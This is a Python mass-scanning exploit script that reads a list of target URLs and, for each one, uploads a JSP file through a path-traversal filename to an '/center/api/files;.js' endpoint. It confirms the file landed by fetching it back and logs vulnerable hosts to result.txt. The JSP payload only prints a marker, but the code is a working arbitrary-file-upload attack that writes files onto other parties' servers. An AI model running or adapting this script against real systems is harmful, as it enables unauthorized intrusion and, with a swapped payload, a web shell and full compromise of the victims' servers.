import argparse
import time
import requests


def get_url(file):
    with open('{}'.format(file), 'r', encoding='utf-8') as f:
        for i in f:
            i = i.replace('\n', '')
            send_req(i)


def write_result(content):
    f = open("result.txt", "a", encoding="UTF-8")
    f.write('{}\n'.format(content))
    f.close()


def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/center/api/files;.js'
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe'
    }
    data = (
        "------WebKitFormBoundaryxxmdzwoe\r\n"
        'Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi1.jsp"\r\n'
        'Content-Type:image/jpeg\r\n'
        "\r\n"
        '<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>\r\n'
        "------WebKitFormBoundaryxxmdzwoe--\r\n"
    )

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=header, data=data, verify=False, timeout=3)

        url2 = "{}/clusterMgr/ukgmfyufsi1.jsp;.js".format(url_check)
        res2 = requests.get(url2, verify=False)
        if response.status_code == 200 and res2.status_code == 200 and "pboyjnnrfipmplsukdeczudsefxmywex" in res2.text:
            result = '{} 存在任意文件上传漏洞! 请访问目标自测：{} \n'.format(url_check, url2)
            print(result)
            write_result(result)
        time.sleep(1)
    except Exception as e:
        pass


if __name__ == '__main__':
    file = r"D:\pycharm\pythonProject\1004.txt"
    get_url(file)